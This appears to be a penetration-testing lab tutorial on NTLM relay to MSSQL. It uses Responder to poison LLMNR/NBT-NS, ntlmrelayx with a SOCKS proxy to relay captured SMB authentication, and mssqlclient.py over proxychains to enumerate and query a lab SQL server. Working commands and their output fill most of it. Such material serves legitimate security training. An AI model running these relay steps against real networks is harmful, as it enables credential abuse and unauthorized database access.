# NTLM Relay over MSSQL

From the previous enumeration we have performed against the 172.16.117.0/24 network, we identified that 172.16.117.60 has the `MSSQL` service running. We can use `ntlmrelayx` to target the `MSSQL` service on 172.16.117.60 and establish an authenticated session so that we can access them using `mssqlclient.py` via `proxychains`.

[mssqlclient.py](https://github.com/fortra/impacket/blob/master/examples/mssqlclient.py) is a Python script from the impacket family, that implements [Tabular Data Stream Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-tds/b46a581a-39de-4745-b076-ec4dbb7d13ec) ( `TDS`) and [SQL Server Resolution Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/mc-sqlr/1ea6e25f-bff9-4364-ba21-5dc449a601b7) ( `SSRP`) to connect to `MSSQL` database servers and query data from them.

As we saw with `SMB`, there is the possibility that a user might mistype a `UNC`, resulting in broadcast messages via LLMNR or NBT-NS. If we have `Responder` running, we can poison the responses and redirect the authentication to our machine. Instead of abusing the SMB protocol, we will relay the connection we receive to a `MSSQL Server`.

### SOCKS Proxy
To abuse this protocol, we will use `ntlmrelayx`, `mssqlclient`, and `Responder`:

- `ntlmrelayx` will allow us to relay the request to the target.
- `mssqlclient` will be used to interact with the SQL database.
- `Responder` will poison any user request and redirect it to our attack host at `172.16.117.30`.

Let’s start by running `ntlmrelayx` with the `-socks` option, targeting the `mssql` service of the target machine `172.16.117.60`:

```
sudo ntlmrelayx.py -t mssql://172.16.117.60 -smb2support -socks

Impacket v0.11.0 - Copyright 2023 Fortra

<SNIP>

[*] Servers started, waiting for connections
```

Notice how we are using the `mssql://` scheme in the target defintion `-t mssql://172.16.117.60`; this makes `ntlmrelayx` to relay `NTLM` over `mssql` to the relay target, instead of the default `SMB` protocol:

**Note:** Remember that we can also specify the user that we want to relay the authentication of using `named targets` in the target definition: `scheme://DOMAIN\\USER@TARGETIP`.

Afterward, we will run `Responder` after setting its `SMB` server to `Off`:

```
python3 Responder.py -I ens192
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.3.0

<SNIP>

[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [On]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [OFF]
    Kerberos server            [ON]
    SQL server                 [On]
    <SNIP>

[+] Listening for events...

<SNIP>
```

Once `Responder` poisons the broadcast traffic, we will notice that `ntlmrelayx` relays the `SMB NTLM` authentication from 172.16.117.3 over `MSSQL` on 172.16.117.60, which is one type of `cross-protocol relaying`, as inferred from the message `[*] SMBD-Thread-10: Received connection from 172.16.117.3, attacking target mssql://172.16.117.60`:

```
sudo ntlmrelayx.py -t mssql://172.16.117.60 -smb2support -socks

Impacket v0.11.0 - Copyright 2023 Fortra

<SNIP>
ntlmrelayx>
[*] SMBD-Thread-10: Received connection from 172.16.117.3, attacking target mssql://172.16.117.60
[*] Authenticating against mssql://172.16.117.60 as INLANEFREIGHT/NPORTS SUCCEED
[*] SOCKS: Adding INLANEFREIGHT/[email protected](1433) to active SOCKS connection. Enjoy
```

> [!NOTE]
>  For any `post-relay` attacks targeting `MSSQL`, you must switch to the `root` user by using the command `sudo su -` before running `ntlmrelayx`. Moreoever, we can always try to restart `ntlmrelayx` and `Responder` if our NTLM Relay attacks do not work.

**Note:** It is important to note that if we attack a computer and receive authentication from it, we cannot relay its authentication because Windows patched the `NTLM self-relay` attack on all modern systems.

In this example, `INLANEFREIGHT/NPORTS` user also initiates authentication from `172.16.117.60`, which may cause `ntlmrelayx` to stop receiving new requests from other IPs. We can avoid this by either turning off the HTTP server using the `--no-http-server` option to prevent NPORTS’s HTTP connections, editing the `Responder.conf` to not respond to requests from 172.16.117.60 or using `-tf` instead of a single target, to enable `multi-relay`.

Then, we can use `ntlmrelayx`’s interactive command `socks` to display the authenticated sessions available for use on the SOCKS server:

```
ntlmrelayx> socks

Protocol  Target         Username              AdminStatus  Port
--------  -------------  --------------------  -----------  ----
MSSQL     172.16.117.60  INLANEFREIGHT/NPORTS  N/A          1433
```

Now we will tunnel `mssqlclient.py` via `proxychains` to connect to `MSSQL` on 172.16.117.60 as `INLANEFREIGHT\NPORTS`. The option `-windows-auth` forces Windows authentication instead of the default SQL authentication, while `-no-pass` prevents `mssqclient.py` from prompting us for a password, as we will abuse the authenticated session established by `ntlmrelayx`:

```
proxychains -q mssqlclient.py INLANEFREIGHT/[email protected] -windows-auth -no-pass

Impacket v0.11.0 - Copyright 2023 Fortra

[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(SQL01\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(SQL01\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208)
[!] Press help for extra shell commands
SQL (INLANEFREIGHT\nports  dbo@master)> help

    lcd {path}                 - changes the current local directory to {path}
    exit                       - terminates the server process (and this session)
    enable_xp_cmdshell         - you know what it means
    disable_xp_cmdshell        - you know what it means
    enum_db                    - enum databases
    enum_links                 - enum linked servers
    enum_impersonate           - check logins that can be impersonate
    enum_logins                - enum login users
    enum_users                 - enum current db users
    enum_owner                 - enum db owner
    exec_as_user {user}        - impersonate with execute as user
    exec_as_login {login}      - impersonate with execute as login
    xp_cmdshell {cmd}          - executes cmd using xp_cmdshell
    xp_dirtree {path}          - executes xp_dirtree on the path
    sp_start_job {cmd}         - executes cmd using the sql server agent (blind)
    use_link {link}            - linked server to use (set use_link localhost to go back to local or use_link .. to get back one step)
    ! {cmd}                    - executes a local shell cmd
    show_query                 - show query
    mask_query                 - mask query
```

We then can query the `MSSQL` server and exfiltrate the data within it; for example, we can enumerate all the databases available using `enum_db`:

```
SQL (INLANEFREIGHT\nports  dbo@master)> enum_db

name            is_trustworthy_on
-------------   -----------------
master                          0
tempdb                          0
model                           0
msdb                            1
development01                   0
```

### Query Execution

Another option is to execute `MSSQL` queries directly using the `-q` option:
```
sudo ntlmrelayx.py -t mssql://INLANEFREIGHT\\[email protected] -smb2support -q "SELECT name FROM sys.databases;"

Impacket v0.11.0 - Copyright 2023 Fortra

<SNIP>

[*] Servers started, waiting for connections
[*] SMBD-Thread-5: Received connection from 172.16.117.3, attacking target mssql://172.16.117.60
[*] Authenticating against mssql://172.16.117.60 as INLANEFREIGHT/NPORTS SUCCEED
[*] Executing SQL: SELECT name FROM sys.databases;
name
-------------
master
tempdb
model
msdb
development01
<SNIP>
```